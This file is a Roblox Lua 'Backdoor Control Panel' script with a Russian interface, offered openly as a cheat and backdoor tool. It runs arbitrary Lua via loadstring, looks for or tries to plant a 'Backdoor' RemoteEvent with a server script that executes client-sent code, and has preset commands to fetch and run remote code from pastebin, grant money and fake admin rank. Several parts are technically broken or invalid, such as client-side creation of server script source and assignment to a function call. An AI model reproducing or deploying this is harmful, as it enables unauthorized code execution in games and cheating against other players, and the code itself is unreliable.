--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local guiSettings = {Title="Backdoor Control Panel",Color=Color3.fromRGB(40, 40, 50),Accent=Color3.fromRGB(0, 170, 255),Font=Enum.Font.SourceSansBold,FontSize=18,Transparency=0.05};
local function createBackdoorGUI()
	local player = game:GetService("Players").LocalPlayer;
	if not player then
		return;
	end
	local screenGui = Instance.new("ScreenGui");
	screenGui.Name = "BackdoorController";
	screenGui.ResetOnSpawn = false;
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
	local mainFrame = Instance.new("Frame");
	mainFrame.Size = UDim2.new(0, 450, 0, 550);
	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -275);
	mainFrame.BackgroundColor3 = guiSettings.Color;
	mainFrame.BackgroundTransparency = guiSettings.Transparency;
	mainFrame.BorderSizePixel = 0;
	mainFrame.Active = true;
	mainFrame.Draggable = true;
	local corner = Instance.new("UICorner");
	corner.CornerRadius = UDim.new(0, 12);
	corner.Parent = mainFrame;
	local stroke = Instance.new("UIStroke");
	stroke.Color = guiSettings.Accent;
	stroke.Thickness = 2;
	stroke.Transparency = 0.5;
	stroke.Parent = mainFrame;
	local titleBar = Instance.new("Frame");
	titleBar.Size = UDim2.new(1, 0, 0, 40);
	titleBar.BackgroundColor3 = guiSettings.Accent;
	titleBar.BackgroundTransparency = 0.2;
	titleBar.BorderSizePixel = 0;
	titleBar.Parent = mainFrame;
	local titleCorner = Instance.new("UICorner");
	titleCorner.CornerRadius = UDim.new(0, 12);
	titleCorner.Parent = titleBar;
	local title = Instance.new("TextLabel");
	title.Size = UDim2.new(1, -50, 1, 0);
	title.Position = UDim2.new(0, 15, 0, 0);
	title.BackgroundTransparency = 1;
	title.Text = guiSettings.Title;
	title.TextColor3 = Color3.new(1, 1, 1);
	title.TextSize = 22;
	title.Font = guiSettings.Font;
	title.TextXAlignment = Enum.TextXAlignment.Left;
	title.Parent = titleBar;
	local closeBtn = Instance.new("TextButton");
	closeBtn.Size = UDim2.new(0, 30, 0, 30);
	closeBtn.Position = UDim2.new(1, -35, 0.5, -15);
	closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70);
	closeBtn.Text = "✕";
	closeBtn.TextColor3 = Color3.new(1, 1, 1);
	closeBtn.TextSize = 20;
	closeBtn.Font = guiSettings.Font;
	closeBtn.AutoButtonColor = false;
	closeBtn.Parent = titleBar;
	local closeCorner = Instance.new("UICorner");
	closeCorner.CornerRadius = UDim.new(1, 0);
	closeCorner.Parent = closeBtn;
	closeBtn.MouseButton1Click:Connect(function()
		screenGui:Destroy();
	end);
	local content = Instance.new("ScrollingFrame");
	content.Size = UDim2.new(1, -20, 1, -70);
	content.Position = UDim2.new(0, 10, 0, 50);
	content.BackgroundTransparency = 1;
	content.BorderSizePixel = 0;
	content.ScrollBarThickness = 6;
	content.CanvasSize = UDim2.new(0, 0, 0, 0);
	content.AutomaticCanvasSize = Enum.AutomaticSize.Y;
	content.Parent = mainFrame;
	local listLayout = Instance.new("UIListLayout");
	listLayout.Padding = UDim.new(0, 10);
	listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center;
	listLayout.SortOrder = Enum.SortOrder.LayoutOrder;
	listLayout.Parent = content;
	local function createSection(title)
		local section = Instance.new("Frame");
		section.Size = UDim2.new(1, -10, 0, 0);
		section.BackgroundColor3 = Color3.fromRGB(30, 30, 40);
		section.BackgroundTransparency = 0.2;
		section.BorderSizePixel = 0;
		section.AutomaticSize = Enum.AutomaticSize.Y;
		section.Parent = content;
		local sectionCorner = Instance.new("UICorner");
		sectionCorner.CornerRadius = UDim.new(0, 8);
		sectionCorner.Parent = section;
		local sectionTitle = Instance.new("TextLabel");
		sectionTitle.Size = UDim2.new(1, -20, 0, 35);
		sectionTitle.Position = UDim2.new(0, 10, 0, 0);
		sectionTitle.BackgroundTransparency = 1;
		sectionTitle.Text = title;
		sectionTitle.TextColor3 = guiSettings.Accent;
		sectionTitle.TextSize = 20;
		sectionTitle.Font = guiSettings.Font;
		sectionTitle.TextXAlignment = Enum.TextXAlignment.Left;
		sectionTitle.Parent = section;
		local container = Instance.new("Frame");
		container.Size = UDim2.new(1, -20, 0, 0);
		container.Position = UDim2.new(0, 10, 0, 35);
		container.BackgroundTransparency = 1;
		container.AutomaticSize = Enum.AutomaticSize.Y;
		container.Parent = section;
		local containerLayout = Instance.new("UIListLayout");
		containerLayout.Padding = UDim.new(0, 8);
		containerLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center;
		containerLayout.SortOrder = Enum.SortOrder.LayoutOrder;
		containerLayout.Parent = container;
		return container;
	end
	local function createButton(parent, text, color, callback)
		local btn = Instance.new("TextButton");
		btn.Size = UDim2.new(1, 0, 0, 45);
		btn.BackgroundColor3 = color or guiSettings.Accent;
		btn.Text = text;
		btn.TextColor3 = Color3.new(1, 1, 1);
		btn.TextSize = 18;
		btn.Font = guiSettings.Font;
		btn.AutoButtonColor = false;
		btn.Parent = parent;
		local btnCorner = Instance.new("UICorner");
		btnCorner.CornerRadius = UDim.new(0, 6);
		btnCorner.Parent = btn;
		btn.MouseButton1Click:Connect(callback);
		btn.MouseEnter:Connect(function()
			btn.BackgroundTransparency = 0.3;
		end);
		btn.MouseLeave:Connect(function()
			btn.BackgroundTransparency = 0;
		end);
		return btn;
	end
	local function createTextBox(parent, placeholder, isMultiLine)
		local container = Instance.new("Frame");
		container.Size = UDim2.new(1, 0, 0, (isMultiLine and 120) or 40);
		container.BackgroundColor3 = Color3.fromRGB(20, 20, 30);
		container.BackgroundTransparency = 0.3;
		container.BorderSizePixel = 0;
		container.Parent = parent;
		local containerCorner = Instance.new("UICorner");
		containerCorner.CornerRadius = UDim.new(0, 6);
		containerCorner.Parent = container;
		local textBox = Instance.new("TextBox");
		textBox.Size = UDim2.new(1, -10, 1, -10);
		textBox.Position = UDim2.new(0, 5, 0, 5);
		textBox.BackgroundTransparency = 1;
		textBox.PlaceholderText = placeholder;
		textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150);
		textBox.Text = "";
		textBox.TextColor3 = Color3.new(1, 1, 1);
		textBox.TextSize = 16;
		textBox.Font = Enum.Font.SourceSans;
		textBox.ClearTextOnFocus = false;
		textBox.MultiLine = isMultiLine;
		textBox.TextWrapped = true;
		textBox.Parent = container;
		return textBox;
	end
	local function createStatusBar(parent)
		local bar = Instance.new("Frame");
		bar.Size = UDim2.new(1, 0, 0, 35);
		bar.BackgroundColor3 = Color3.fromRGB(30, 30, 40);
		bar.BackgroundTransparency = 0.2;
		bar.BorderSizePixel = 0;
		bar.Parent = parent;
		local barCorner = Instance.new("UICorner");
		barCorner.CornerRadius = UDim.new(0, 6);
		barCorner.Parent = bar;
		local status = Instance.new("TextLabel");
		status.Size = UDim2.new(1, -20, 1, 0);
		status.Position = UDim2.new(0, 10, 0, 0);
		status.BackgroundTransparency = 1;
		status.Text = "✅ Система готова";
		status.TextColor3 = Color3.fromRGB(100, 255, 100);
		status.TextSize = 16;
		status.Font = Enum.Font.SourceSans;
		status.TextXAlignment = Enum.TextXAlignment.Left;
		status.Parent = bar;
		return status;
	end
	local statusSection = createSection("🔌 Статус подключения");
	local statusBar = createStatusBar(statusSection);
	local localSection = createSection("💻 Локальные скрипты (Client)");
	local localCodeBox = createTextBox(localSection, "Введите Lua код для выполнения на клиенте...", true);
	createButton(localSection, "▶ Выполнить локально", Color3.fromRGB(0, 200, 100), function()
		local code = localCodeBox.Text;
		if (code and (#code > 0)) then
			local success, result = pcall(function()
				local func = loadstring(code);
				if func then
					return func();
				end
			end);
			statusBar.Text = (success and "✅ Локальный код выполнен") or ("❌ Ошибка: " .. tostring(result));
		end
	end);
	local serverSection = createSection("🌐 Серверные скрипты (Server)");
	local remote = nil;
	for _, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
		if (v:IsA("RemoteEvent") and v.Name:match("^Backdoor")) then
			remote = v;
			break;
		end
	end
	if not remote then
		remote = Instance.new("RemoteEvent");
		remote.Name = "Backdoor_" .. math.random(1000, 9999);
		remote.Parent = game:GetService("ReplicatedStorage");
		local serverScript = Instance.new("Script");
		serverScript.Name = "BackdoorHandler";
		serverScript.Source = [[
            local remote = script.Parent
            remote.OnServerEvent:Connect(function(player, code)
                -- Проверка авторизации (можно добавить свою)
                if player.UserId == game.Players.LocalPlayer.UserId then
                    local func = loadstring("return function() " .. code .. " end")()
                    if func then
                        pcall(func)
                    end
                end
            end)
        ]];
		serverScript.Parent = remote;
	end
	local serverCodeBox = createTextBox(serverSection, "Введите Lua код для выполнения на сервере...", true);
	createButton(serverSection, "▶ Выполнить на сервере", Color3.fromRGB(255, 100, 0), function()
		local code = serverCodeBox.Text;
		if (code and (#code > 0) and remote) then
			remote:FireServer(code);
			statusBar.Text = "📤 Команда отправлена на сервер";
		end
	end);
	local quickSection = createSection("⚡ Быстрые команды");
	local quickGrid = Instance.new("Frame");
	quickGrid.Size = UDim2.new(1, 0, 0, 0);
	quickGrid.BackgroundTransparency = 1;
	quickGrid.AutomaticSize = Enum.AutomaticSize.Y;
	quickGrid.Parent = quickSection;
	local gridLayout = Instance.new("UIGridLayout");
	gridLayout.CellSize = UDim2.new(0.5, -5, 0, 40);
	gridLayout.CellPadding = UDim2.new(0, 5, 0, 5);
	gridLayout.FillDirection = Enum.FillDirection.Horizontal;
	gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center;
	gridLayout.SortOrder = Enum.SortOrder.LayoutOrder;
	gridLayout.Parent = quickGrid;
	local quickCommands = {{name="📋 Игроки",type="server",code="for _, p in pairs(game.Players:GetPlayers()) do print(p.Name) end"},{name="💰 Дать деньги",type="server",code="game.Players.LocalPlayer.leaderstats.Money.Value = 999999"},{name="⚡ ESP",type="client",code="loadstring(game:HttpGet('https://pastebin.com/raw/esp'))()"},{name="🛡️ Админка",type="server",code="game.Players.LocalPlayer:GetRankInGroup(1) = 255"},{name="🌍 Телепорт",type="client",code="game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,100,0)"},{name="📦 Инвентарь",type="server",code="print(game:GetService('Players'):GetPlayers())"}};
	for _, cmd in pairs(quickCommands) do
		local btn = Instance.new("TextButton");
		btn.Size = UDim2.new(1, 0, 1, 0);
		btn.BackgroundColor3 = ((cmd.type == "server") and Color3.fromRGB(255, 100, 0)) or Color3.fromRGB(0, 200, 100);
		btn.Text = cmd.name;
		btn.TextColor3 = Color3.new(1, 1, 1);
		btn.TextSize = 14;
		btn.Font = Enum.Font.SourceSansBold;
		btn.AutoButtonColor = false;
		btn.Parent = quickGrid;
		local btnCorner = Instance.new("UICorner");
		btnCorner.CornerRadius = UDim.new(0, 4);
		btnCorner.Parent = btn;
		btn.MouseButton1Click:Connect(function()
			if ((cmd.type == "server") and remote) then
				remote:FireServer(cmd.code);
				statusBar.Text = "📤 Серверная команда: " .. cmd.name;
			else
				local func = loadstring(cmd.code);
				if func then
					pcall(func);
					statusBar.Text = "✅ Локальная команда: " .. cmd.name;
				end
			end
		end);
	end
	local savedSection = createSection("💾 Сохраненные скрипты");
	local savedScripts = {{name="Админ панель",type="client",code=[[
            -- Простая админ панель
            local admins = {[game.Players.LocalPlayer.UserId] = true}
            print("Админ панель загружена")
        ]]},{name="Фарм денег",type="server",code=[[
            while wait(1) do
                game.Players.LocalPlayer.leaderstats.Money.Value = game.Players.LocalPlayer.leaderstats.Money.Value + 1000
            end
        ]]}};
	for _, saved in pairs(savedScripts) do
		local btn = createButton(savedSection, "📂 " .. saved.name, Color3.fromRGB(100, 100, 150), function()
			if ((saved.type == "server") and remote) then
				remote:FireServer(saved.code);
				statusBar.Text = "📤 Загружен: " .. saved.name;
			else
				local func = loadstring(saved.code);
				if func then
					pcall(func);
					statusBar.Text = "✅ Загружен: " .. saved.name;
				end
			end
		end);
	end
	local infoSection = createSection("ℹ Информация");
	local infoLabel = Instance.new("TextLabel");
	infoLabel.Size = UDim2.new(1, 0, 0, 80);
	infoLabel.BackgroundTransparency = 1;
	infoLabel.Text = "Игрок: " .. player.Name .. "\nServer: " .. game.GameId .. "\nRemote: " .. ((remote and remote.Name) or "Не найден");
	infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200);
	infoLabel.TextSize = 14;
	infoLabel.Font = Enum.Font.SourceSans;
	infoLabel.TextWrapped = true;
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left;
	infoLabel.Parent = infoSection;
	mainFrame.Parent = screenGui;
	screenGui.Parent = player:WaitForChild("PlayerGui");
	return screenGui;
end
createBackdoorGUI();